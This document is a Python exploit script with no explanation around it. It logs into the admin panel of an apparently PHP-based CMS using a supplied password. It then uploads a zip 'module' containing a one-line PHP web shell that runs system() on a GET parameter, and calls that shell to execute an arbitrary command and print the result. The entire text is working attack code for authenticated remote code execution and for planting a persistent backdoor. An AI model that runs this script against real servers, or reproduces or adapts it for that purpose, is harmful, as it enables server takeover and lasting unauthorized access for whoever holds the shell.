#!/usr/bin/env python3

import requests
import argparse
import zipfile
import io

parser = argparse.ArgumentParser()
parser.add_argument('-u', help="Target Url", required=True)
parser.add_argument('-p', help="Admin Password", required=True)
parser.add_argument('-c', help="command", required=True)

proxy = {'http':'http://127.0.0.1:8080'}
args = parser.parse_args()
def login():
    s = requests.Session()
    cookie = s.cookies
    data = {'cont1':args.p,
            'bogus':'',
            'submit':'Log in'
            }
    r = s.post(args.u + '/login.php', data=data, cookies=cookie, proxies=proxy)

    if r.status_code == 200:
        print("[+] Logged in")
    else:
        print(f"[-] Login failed with an error code: {r.status_code}")

    return s


def upload():
    s = login()
    cookie = s.cookies
    data = io.BytesIO()
    zip_file = "payload.zip"
    with zipfile.ZipFile(zip_file, mode="w") as z:
        z.writestr("payload/", "")
        z.writestr("payload/shell.php", "<?php system($_GET['pwn']); ?>")
    
    data = {"submit": "Upload"}

    with open (zip_file, "rb") as f:
        files  = {"sendfile": (zip_file, f, "application/zip")}
        r = s.post(args.u + '/admin.php?action=installmodule', files=files, proxies=proxy, cookies=cookie, data=data)

    if r.status_code == 200:
        print("[+] Module installed successfully")
    else:
        print("[-] Upload failed with status code: ", r.status_code)

def pwn():
    print("[+] Executing Command")
    r = requests.get(args.u + f'/data/modules/payload/payload/shell.php?pwn={args.c}', proxies=proxy)
    print("[+] output: \n", r.text)

upload()
pwn()



    
